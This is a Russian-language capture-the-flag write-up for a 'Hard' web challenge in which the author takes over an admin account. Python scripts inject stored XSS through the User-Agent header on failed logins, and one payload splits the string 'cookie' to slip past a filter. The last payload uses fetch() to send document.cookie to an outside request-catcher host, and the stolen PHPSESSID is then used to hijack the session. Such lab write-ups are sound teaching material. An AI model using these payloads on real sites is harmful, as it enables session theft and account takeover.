**level**: **Hard**
**Description**: Воображение важнее, чем знания
**IP**: 62.173.140.174:16035

На сайте предлагают ввести логин и пароль для регистрации. Нам нужно получить доступ к аккаунту админа.

Изучим html код.
Находим какой-то скрытый функционал, который позже нам пригодится.
Видим личный кабинет  с "failed login attempts". Попробуем произвести попытку логина с неправильным паролем с другого браузера или с режимом инкогнито.

Попробуем зарегистрировать пользователя с логином:
<script>alert(1)</script>

Также попробуем зайти вне с неправильным паролем. Обнаруживаем, что XSS-уязвимость есть, что поможет захватить аккаунт. Если мы сумеем послать наш пейлоад, то мы сможем запустить на нем javascript code.
Конечно, изменить имя admin на пейлоад нельзя, но не будем забывать что есть еще другие поля, которые тоже скорее всего подвержены XSS-атаке.
На поле User-Agent мы можем повлиять, в отличие от полей id, username, IP, Date.

Для этого напишем скрипт на python, который мы будем использовать в дальнейшем.

-----

import requests

payload = "<script>alert(1);</script>" # это пейлоад

user = "asdf" #Тут наш username
headers = {'User-Agent': payload} # Вставляем его в хедер
data = {"username":user, "password":"aboba"}


response = requests.post('http://62.173.140.174:16035/login.php', headers=headers, data=data) # Совершаем попытку логина с неверным паролем
 
print(response.status_code)# Выводим информацию
#print(response.text) 

-----

Мы смогли внедрить свой код.
Поизучав результаты по запросу "XSS steal cookie payloads", обнаруживаем, что нам нужно захватить ```document.cookie```

Попробуем использовать простой alert();

-----

import requests


payload = '<script>alert(document.cookie);</script>'

user = "asdf" 
headers = {'User-Agent': payload}
data = {"username":user, "password":"aboba"}


response = requests.post('http://62.173.140.174:16035/login.php', headers=headers, data=data)
 
print(response.status_code)
print(response.text)

-----

Все сработало, кроме alert. Необходимо это как-то обойти.

Так как нам нужно в функции alert() вывести document.cookie, то попробуем сделать это иным способом, а именно с помощью переменных.

-----

python 
import requests

payload = '<script>const vv = ["coo", "kie"].join("");alert(document[vv]);</script>'

user = "asdf" 
headers = {'User-Agent': payload}
data = {"username":user, "password":"aboba"}

response = requests.post('http://62.173.140.174:16035/login.php', headers=headers, data=data)
 
print(response.status_code)
print(response.text)

-----

То, что вывели в alert будем ловить на его сервер.

Перейдем во вкладку и скопируем url, чтобы перейти по ней в браузере. Нажимаем на Poll now, и получаем данные с сервера.

Нам предоставили доступ к request, теперь мы можем его детально рассмотреть.
Эта функция заменит нам ngrok или свой белый IP и сервер.
Копируем и вставляем в скрипт.

-----

import requests

payload = '<script>const vv = ["coo", "kie"].join(""); var payload = `https://{{СЮДА}}/?${vv}=` + document[vv]; fetch(payload);</script>'

user = "admin" 
headers = {'User-Agent': payload}
data = {"username":user, "password":"aboba"}


response = requests.post('http://62.173.140.174:16035/login.php', headers=headers, data=data)
 
print(response.status_code)
print(response.text)

````

Отправляем и подставляем значение PHPSESSID в наш браузер. 
